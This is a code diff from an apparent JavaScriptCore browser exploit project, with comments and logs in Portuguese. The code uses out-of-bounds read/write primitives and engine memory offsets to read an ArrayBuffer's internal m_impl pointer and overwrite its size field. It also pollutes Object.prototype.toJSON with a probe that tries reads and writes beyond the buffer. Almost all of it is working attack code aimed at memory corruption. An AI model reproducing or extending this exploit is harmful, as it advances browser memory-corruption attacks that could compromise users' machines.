@@ -11,17 +11,17 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
+// A LINHA ABAIXO FOI REMOVIDA, POIS toJSON_AttemptWriteToThis_v3 é definida neste arquivo:
+// import { toJSON_AttemptWriteToThis } from './testJsonTypeConfusionUAFSpeculative.mjs'; 
+
 // toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
-export function toJSON_AttemptWriteToThis_v3() { // Renomeada para v3 para clareza
+export function toJSON_AttemptWriteToThis_v3() { 
     let initial_buffer_size_for_oob_check;
 
-    // Determina o tamanho original esperado do buffer 'this'
-    // Se 'this' for o oob_array_buffer_real global, usa seu tamanho de alocação conhecido.
-    // Caso contrário, assume um tamanho padrão (ex: 64 para um victim_ab genérico).
     if (typeof oob_array_buffer_real !== 'undefined' && this === oob_array_buffer_real) {
         initial_buffer_size_for_oob_check = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
     } else {
-        initial_buffer_size_for_oob_check = 64; // Tamanho padrão se 'this' for outro buffer (ex: victim_ab)
+        initial_buffer_size_for_oob_check = 64; 
     }
 
     let result_payload = {
@@ -112,7 +112,6 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
     logS3(`--- Iniciando Teste: Corromper Tamanho em ArrayBufferContents ---`, "test", FNAME_TEST);
     document.title = `Corrupt ABContents Size Test`;
 
-    // Garante que os offsets são lidos e parseados corretamente
     if (!JSC_OFFSETS.ArrayBuffer || !JSC_OFFSETS.ArrayBufferContents) {
         logS3("ERRO: JSC_OFFSETS.ArrayBuffer ou JSC_OFFSETS.ArrayBufferContents não definidos em config.mjs.", "error", FNAME_TEST);
         return { errorOccurred: new Error("Config ArrayBuffer/ArrayBufferContents offsets missing"), stringifyResult: null, potentiallyCrashed: false };
@@ -155,11 +154,11 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
     let corruption_step_error = null;
     let stringifyResult = null;
     let errorOccurred = null;
-    let potentiallyCrashed = true; 
+    let potentiallyCrashed = true;
 
     try {
         logS3(`1. Lendo ponteiro m_impl de oob_array_buffer_real @ offset ${toHex(contentsImplPtrOffset)}...`, "info", FNAME_TEST);
-        contents_impl_ptr_val = oob_read_absolute(contentsImplPtrOffset, 8); 
+        contents_impl_ptr_val = oob_read_absolute(contentsImplPtrOffset, 8);
 
         if (!isAdvancedInt64Object(contents_impl_ptr_val) || (contents_impl_ptr_val.low() === 0 && contents_impl_ptr_val.high() === 0)) {
             throw new Error(`Ponteiro m_impl lido é inválido ou nulo: ${contents_impl_ptr_val ? contents_impl_ptr_val.toString(true) : 'null'}`);
@@ -171,11 +170,6 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         
         logS3(`3. Escrevendo novo tamanho ${toHex(new_corrupted_size)} em ${target_size_field_address_obj.toString(true)}...`, "warn", FNAME_TEST);
         
-        // Esta é a parte crítica que depende da sua primitiva oob_write_absolute
-        // Se ela for relativa ao oob_array_buffer_real, este write NÃO atingirá um endereço de heap absoluto.
-        // Se o target_size_field_address_obj for um endereço de heap real, você precisa de uma primitiva de escrita absoluta.
-        // Por agora, o código assume que, se o endereço for "baixo" (high part = 0), ele é um offset dentro
-        // do oob_array_buffer_real, o que seria um cenário de corrupção diferente do planejado.
         if (target_size_field_address_obj.high() === 0 && target_size_field_address_obj.low() < oob_array_buffer_real.byteLength) {
              logS3(`   Endereço calculado ${target_size_field_address_obj.toString(true)} é um offset baixo DENTRO de oob_array_buffer_real. Tentando escrita relativa...`, "info", FNAME_TEST);
              oob_write_absolute(target_size_field_address_obj.low(), new_corrupted_size, 4);
@@ -204,7 +198,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         try {
             logS3(`4. Poluindo Object.prototype.toJSON com função de sondagem...`, "info", FNAME_TEST);
             Object.defineProperty(Object.prototype, ppKey_val, {
-                value: toJSON_AttemptWriteToThis_v3, // Usando a v3
+                value: toJSON_AttemptWriteToThis_v3, // Usando a v3 definida neste arquivo
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
@@ -227,8 +221,8 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
             }
         }
     } else {
-         errorOccurred = corruption_step_error; 
-         potentiallyCrashed = false; 
+         errorOccurred = corruption_step_error;
+         potentiallyCrashed = false;
     }
     
     if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
@@ -250,7 +244,7 @@ export async function executeCorruptArrayBufferContentsSizeTest() {
         }
     } else if (errorOccurred) {
         logS3(`   Teste concluído com erro: ${errorOccurred.message}`, "error", FNAME_TEST);
-    } else if (potentiallyCrashed && !corruption_step_error) { 
+    } else if (potentiallyCrashed && !corruption_step_error) {
         logS3(`   O TESTE PODE TER CONGELADO ANTES DA SONDAGEM toJSON.`, "error", FNAME_TEST);
     }
 
